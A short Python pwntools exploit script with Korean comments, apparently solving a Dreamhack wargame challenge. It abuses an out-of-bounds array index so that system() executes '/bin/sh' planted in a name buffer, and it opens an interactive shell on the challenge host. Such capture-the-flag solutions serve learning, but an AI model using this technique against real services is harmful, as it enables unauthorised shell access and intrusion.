from pwn import *

# 1. 설정
p = remote('host8.dreamhack.games', 10487)
# 로컬 분석을 위해 바이너리 로드 (없으면 다운로드해서 같은 폴더에 두세요)
# 다운로드: 문제 페이지의 첨부파일
e = ELF('./out_of_bound')

# 2. 주소 정보 획득
name_addr = e.symbols['name']
command_addr = e.symbols['command']

log.info(f"name address: {hex(name_addr)}")
log.info(f"command address: {hex(command_addr)}")

# 3. 페이로드 작성
# name 버퍼 구조: [주소(4바이트)] + ["/bin/sh"(8바이트)]
# system 함수는 인자로 전달된 주소에 있는 문자열을 실행합니다.
# 우리는 command[idx]를 통해 name[0]의 값을 system에 전달할 것입니다.
# 따라서 name[0]에는 "/bin/sh" 문자열이 있는 곳의 주소(name_addr + 4)가 적혀 있어야 합니다.

payload = p32(name_addr + 4)  # name[0~3]: "/bin/sh"가 저장될 주소
payload += b"/bin/sh\x00"     # name[4~]: 실제 실행할 명령어

# 4. 인덱스 계산
# command 배열의 시작점부터 name 변수까지의 거리(offset)를 4바이트 단위(int index)로 계산
idx = (name_addr - command_addr) // 4

log.info(f"Calculated index: {idx}")

# 5. 공격 수행
# "Admin name: " 에 페이로드 전송
p.sendafter("Admin name: ", payload)

# "What do you want?: " 에 계산한 인덱스 전송
# scanf("%d")는 문자열 형태의 정수를 받으므로 str(idx)로 변환
p.sendafter("What do you want?: ", str(idx))

# 6. 셸 획득 확인
p.interactive()